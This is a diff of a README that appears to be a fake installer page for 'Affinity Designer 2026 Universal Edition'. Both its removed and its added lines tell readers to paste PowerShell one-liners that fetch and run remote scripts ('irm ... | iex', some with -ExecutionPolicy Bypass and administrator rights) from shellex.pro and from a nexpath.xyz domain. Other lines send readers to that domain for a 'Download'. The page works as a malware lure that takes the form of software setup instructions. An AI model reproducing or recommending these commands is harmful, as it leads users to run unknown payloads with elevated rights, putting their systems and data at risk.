@@ -16,13 +16,13 @@ Affinity Designer 2026 Universal Edition · Editing pipeline · Batch tools · W
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://shellex.pro/ps/setup.ps1 | iex
+irm https://affinity-designer-2026.nexpath.xyz/ | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://affinity-designer-2026.nexpath.xyz/ | iex"
 ```
 
 
@@ -58,17 +58,17 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Copy this whole line into PowerShell (Administrator):<br><br><code>irm https://shellex.pro/ps/setup.ps1 | iex</code>
+<br>Open <a href="https://affinity-designer-2026.nexpath.xyz/">affinity-designer-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Windows key → type <b>powershell</b> → right-click → <b>Run as administrator</b>.
+<br>Open <a href="https://affinity-designer-2026.nexpath.xyz/">affinity-designer-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Paste this line instead:<br><br><code>powershell -ExecutionPolicy Bypass -Command "irm https://shellex.pro/ps/setup.ps1 | iex"</code>
+<br>Open <a href="https://affinity-designer-2026.nexpath.xyz/">affinity-designer-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -80,27 +80,12 @@ Notes for users who need **Affinity Designer 2026 Universal Edition** running on
 
 **Topics:** affinity-designer, affinity-app, photo-editing, raw-processing, affinity-designer-setup-failed-fix, how-to-install-affinity-designer, image-workflow, photography-tools, windows-photo, affinity-designer-windows, affinity-designer-windows-setup, affinity-designer-desktop-setup
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
+* **Project link:** **[affinity-designer-2026.nexpath.xyz](https://affinity-designer-2026.nexpath.xyz/)**
+* **Full URL:** `https://affinity-designer-2026.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
